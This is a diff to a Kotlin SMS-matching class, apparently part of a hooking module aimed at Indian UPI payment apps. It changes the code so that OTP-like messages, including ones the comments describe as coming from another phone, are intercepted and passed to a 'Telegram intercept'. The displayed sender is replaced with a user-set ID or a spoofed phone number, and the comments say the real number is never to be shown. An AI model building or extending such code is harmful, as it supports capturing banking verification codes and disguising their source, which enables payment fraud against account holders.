@@ -7,20 +7,16 @@ import java.util.regex.Pattern
 object SmsMatcher {
 
     private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
-    private val SENDER_ID_PATTERN = Pattern.compile(
-        """^(AD|VM|JD|BP|TX|VK|AX|IC|PY|BZ|JM)-[A-Z0-9]+(-S)?$""",
-        Pattern.CASE_INSENSITIVE
-    )
-    private val DEFAULT_SENDER = "AD-TEST-S"
-    private val SENDER_PREFIXES = listOf("AD-", "VM-", "JD-", "BP-", "TX-", "JM-", "VK-", "AX-")
+    private val PLACEHOLDER_SENDER = "AD-TEST-S"
 
     fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
         UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
 
-    /** MESSAGE tab Sender ID — AD-YESBNK-S, JM-UNTYBK-S, etc. */
-    fun savedSenderId(config: ModuleConfig): String? {
-        val id = config.injectSenderId.trim().uppercase()
-        if (id.isBlank() || id == DEFAULT_SENDER) return null
+    /** Jo user MESSAGE tab me dale — bilkul wahi, bina change kiye */
+    fun userSenderId(config: ModuleConfig): String? {
+        val id = config.injectSenderId.trim()
+        if (id.isBlank()) return null
+        if (id.equals(PLACEHOLDER_SENDER, ignoreCase = true)) return null
         return id
     }
 
@@ -39,54 +35,30 @@ object SmsMatcher {
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
 
-        // 1) Hooked UPI app keyword match (sender ya body)
+        val customId = userSenderId(config)
+
+        // Dusre phone se OTP — intercept (display = tumhara Sender ID, number nahi)
+        if (customId != null && isOtpLike(body)) return true
+
         if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
-
-        // 2) Sender ID set — koi bhi SMS intercept (dusre phone se bhi), display = Sender ID
-        val savedId = savedSenderId(config)
-        if (savedId != null) return true
-
-        // 3) Verification OTP + hooked app body keyword
         if (isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
 
         return false
     }
 
-    /**
-     * Telegram / intercept — kabhi real phone number mat dikhao.
-     * Pehle saved Sender ID, phir carrier sender ID, phir spoof number.
-     */
+    /** Telegram intercept — kabhi dusre phone / real number mat dikhao */
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
-        savedSenderId(config)?.let { return it }
-        if (isAlphanumericSenderId(actualPeer)) return normalizeSender(actualPeer)
+        userSenderId(config)?.let { return it }
+        if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
         val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
         return spoof.ifBlank { "INTERCEPT" }
     }
 
-    fun displaySenderId(config: ModuleConfig, actualSender: String): String {
-        savedSenderId(config)?.let { return it }
-        if (isAlphanumericSenderId(actualSender)) return normalizeSender(actualSender)
-        return DEFAULT_SENDER
-    }
-
-    fun senderMatches(actual: String, filter: String): Boolean {
-        val a = normalizeSender(actual)
-        val f = normalizeSender(filter)
-        if (a.isBlank() || f.isBlank()) return false
-        if (a == f) return true
-        val aCompact = a.replace("-", "")
-        val fCompact = f.replace("-", "")
-        return aCompact == fCompact || a.contains(f) || f.contains(a) || aCompact.contains(fCompact)
-    }
-
-    fun normalizeSender(sender: String): String =
-        sender.replace("\\s".toRegex(), "").uppercase()
-
-    fun isAlphanumericSenderId(sender: String): Boolean {
-        val s = normalizeSender(sender)
-        if (SENDER_ID_PATTERN.matcher(s).matches()) return true
-        if (SENDER_PREFIXES.any { s.startsWith(it) }) return true
-        return s.any { it.isLetter() } && !isNumericSender(s)
+    fun isCarrierSenderId(sender: String): Boolean {
+        val s = sender.trim()
+        if (s.isBlank()) return false
+        if (isNumericSender(s)) return false
+        return s.any { it.isLetter() }
     }
 
     fun isNumericSender(sender: String): Boolean {
@@ -117,12 +89,18 @@ object SmsMatcher {
         return tokenChars >= compact.length * 0.85
     }
 
+    private fun isOtpLike(body: String): Boolean {
+        if (isVerificationBody(body)) return true
+        val trimmed = body.trim()
+        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return true
+        return OTP_PATTERN.matcher(trimmed).find()
+    }
+
     private fun isVerificationBody(body: String): Boolean {
         if (isEncryptedToken(body)) return true
         val upper = body.uppercase()
         val keywords = listOf(
-            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO", "YESBNK",
-            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK", "UNTYBK"
+            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "CODE", "PIN", "PASSWORD", "BANK"
         )
         return keywords.any { upper.contains(it) }
     }
